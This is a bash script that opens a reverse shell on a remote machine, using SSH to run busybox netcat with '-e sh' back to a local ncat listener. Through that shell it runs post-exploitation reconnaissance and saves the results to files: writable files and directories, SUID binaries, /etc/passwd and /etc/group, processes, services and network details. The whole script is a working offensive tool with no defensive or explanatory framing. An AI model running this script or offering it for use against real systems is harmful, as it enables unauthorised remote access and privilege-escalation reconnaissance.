#!/usr/bin/env bash

set -e

function triggerRevshell() {
    ssh user@10.2.17.16 busybox nc 10.1.0.88 9002 -e sh >/dev/null 2>/dev/null
}

function listenRevshell() {
    ncat -l 10.1.0.88 9002
}

DIR=data
INIT_COMMAND=""

function commandToFile() {
    local command="$1"
    local file="$2"
    mkdir -p $DIR
    echo "$INIT_COMMAND $command || true \n\n" | listenRevshell >"$DIR/$file" &
    triggerRevshell || true
    wait || true
}

DIR="user"
commandToFile "find / -writable -type f -ls | grep -v node_modules" writeableFiles.txt
commandToFile "systemctl --no-pager --full status" services.txt
commandToFile "ps auxw" processes.txt
commandToFile "ip a ; ip n" network.txt
commandToFile "find / -writable -type d -ls" writeableDirs.txt
commandToFile "find / -type f -perm -04000 -ls" suid.txt
commandToFile "cat /etc/passwd ; cat /etc/group" users.txt
commandToFile "hostname ; uname -a" host.txt
